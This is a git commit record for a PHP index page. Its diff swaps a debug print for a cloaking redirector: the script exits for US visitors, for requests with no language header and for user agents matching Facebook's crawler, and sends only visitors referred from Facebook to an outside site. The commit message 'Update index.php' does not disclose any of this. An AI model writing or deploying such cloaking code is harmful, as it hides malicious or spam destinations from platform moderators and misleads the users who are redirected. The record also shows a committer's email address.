b38f53b97718790a925714ac89a3b41026f2e5c6
hayng <theresiamazza36600@gmail.com>
2016-10-23 18:13:57 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,17 @@
 <?php
-print_r($_SERVER);
-?>
+if($_SERVER['HTTP_X_APPENGINE_COUNTRY'] == 'US'){
+exit;
+}
+if(empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
+exit;
+}
+if(strpos($_SERVER['HTTP_USER_AGENT'],"face") !== false){
+exit;
+}
+$file = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
+$ref = $_SERVER['HTTP_REFERER'];
+if(strpos($ref,"facebook") !== false){
+header("Location: http://petudi.us/mac-izle");
+}else{
+exit;
+}
